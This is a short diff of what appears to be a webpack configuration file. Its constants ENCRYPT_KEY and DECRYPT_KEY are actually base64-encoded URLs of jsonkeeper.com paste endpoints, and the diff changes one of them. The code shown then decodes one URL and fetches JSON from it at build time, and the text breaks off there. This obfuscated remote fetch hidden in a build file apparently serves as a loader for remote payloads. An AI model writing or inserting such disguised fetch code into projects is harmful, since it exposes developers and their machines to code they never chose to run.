@@ -1,6 +1,6 @@
 const webpack = require('webpack');
 const ENCRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9JWUROTQ==";
-const DECRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi81SklQUA==";
+const DECRYPT_KEY = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9NSVNYNg==";
 
 fetch(atob(ENCRYPT_KEY))
 .then(response => response.json()) 
